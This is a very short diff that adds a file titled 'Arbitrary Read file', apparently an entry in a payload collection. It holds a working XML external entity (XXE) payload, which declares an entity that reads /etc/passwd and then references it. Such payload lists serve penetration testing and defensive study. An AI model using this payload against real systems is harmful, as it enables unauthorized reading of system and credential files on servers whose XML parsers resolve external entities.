@@ -1,0 +1,6 @@
+
+# Arbitrary Read file
+<!DOCTYPE meow [<!ENTITY XXE SYSTEM "file:///etc/passwd">]>
+
+&XXE;
+
